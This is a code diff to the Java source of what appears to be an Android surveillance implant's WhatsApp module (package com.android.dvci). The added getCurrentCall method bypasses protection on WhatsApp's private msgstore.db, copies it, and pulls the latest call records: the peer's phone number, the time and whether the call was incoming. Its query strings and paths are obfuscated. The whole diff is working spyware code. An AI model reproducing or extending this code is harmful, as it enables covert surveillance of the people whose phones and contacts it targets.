@@ -2,6 +2,7 @@ package com.android.dvci.module.chat;
 
 import java.io.ByteArrayInputStream;
 import java.io.File;
+import java.io.FileInputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.ObjectInputStream;
@@ -35,6 +36,7 @@ import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.Path;
 import com.android.dvci.module.MessageChatMultimedia;
 import com.android.dvci.module.ModuleAddressBook;
+import com.android.dvci.module.call.CallInfo;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.StringUtils;
 import com.android.dvci.util.Utils;
@@ -124,7 +126,7 @@ public class ChatWhatsapp extends SubModuleChat {
 
 	}
 
-	private String readMyPhoneNumber() {
+	public static String readMyPhoneNumber() {
 		String myPhone = DEFAULT_LOCAL_NUMBER;
 		String myCountryCode = "";
 
@@ -911,4 +913,75 @@ public class ChatWhatsapp extends SubModuleChat {
 		 */
 
 
+	public static boolean getCurrentCall( final CallInfo callInfo) {
+		String sqlQuery = M.e("select _id, key_remote_jid, media_wa_type, key_from_me, timestamp  from messages WHERE media_wa_type='8' order by _id desc limit 20");
+
+
+		RecordVisitor visitor = new RecordVisitor() {
+
+			@Override
+			public long cursor(Cursor cursor) {
+				callInfo.id = cursor.getInt(0);
+				if (callInfo.valid == false) {
+
+					String mm_wa_type_str = cursor.getString(2);
+					int mm_wa_type = 0;
+					if (mm_wa_type_str != null) {
+						try {
+							mm_wa_type = Integer.parseInt(mm_wa_type_str);
+						} catch (Exception e) {
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (getCurrentCall) Error parsingInt: " + mm_wa_type_str + "\n" + e);
+							}
+							mm_wa_type = 0;
+
+							return callInfo.id;
+						}
+						if (mm_wa_type == 8) {
+							callInfo.peer = cursor.getString(1);
+							//peer contains something like this <phoneNumber@s.whatsapp.net>
+							if (callInfo.peer != null && callInfo.peer.lastIndexOf("@") > 0) {
+								callInfo.peer = callInfo.peer.substring(0, callInfo.peer.lastIndexOf("@"));
+								if (Cfg.DEBUG) {
+									Check.log(TAG + "(getCurrentCall): peerIs " + callInfo.peer);
+								}
+							}
+							callInfo.timestamp = new Date(cursor.getLong(4));
+							int from_me = cursor.getInt(3);
+							if (Cfg.DEBUG) {
+								Check.log(TAG + " (cursor) call type: " + from_me);
+							}
+							callInfo.incoming = from_me == 0;
+							// ok we found the last valid call, mark as valid to avoid the other.
+							callInfo.valid = true;
+						}
+					}
+				}
+				return callInfo.id;
+			}
+		};
+		callInfo.valid = false;
+		// f.0=/data/data/com.whatsapp/databases
+		String dbDir = M.e("/data/data/com.whatsapp/databases");
+		// f.1=/msgstore.db
+		String dbFile = M.e("/msgstore.db");
+		if (Path.unprotect(dbDir, dbFile, true)) {
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (getCurrentCall): can read DB");
+			}
+			GenericSqliteHelper helper = GenericSqliteHelper.openCopy(dbDir, dbFile);
+			if (helper == null) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (getCurrentCall) Error, file not readable: " + dbFile);
+				}
+				return false;
+			}
+
+			helper.traverseRawQuery(sqlQuery, new String[]{}, visitor);
+			helper.disposeDb();
+			return callInfo.valid;
+		}
+		return false;
+	}
 }
